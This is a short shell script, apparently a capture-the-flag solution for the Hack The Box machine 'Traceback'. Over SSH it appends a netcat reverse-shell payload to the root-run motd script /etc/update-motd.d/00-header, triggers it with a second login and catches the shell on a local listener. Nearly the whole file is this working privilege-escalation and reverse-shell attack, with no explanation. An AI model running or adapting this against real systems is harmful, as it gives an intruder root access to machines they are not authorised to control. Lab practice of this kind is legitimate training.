#!/bin/sh

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

ssh sysadmin@traceback.htb "echo 'tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.10.14.39 22473 1> /tmp/1' >> /etc/update-motd.d/00-header"
ssh sysadmin@traceback.htb "echo pwned" &
nc -lvp 22473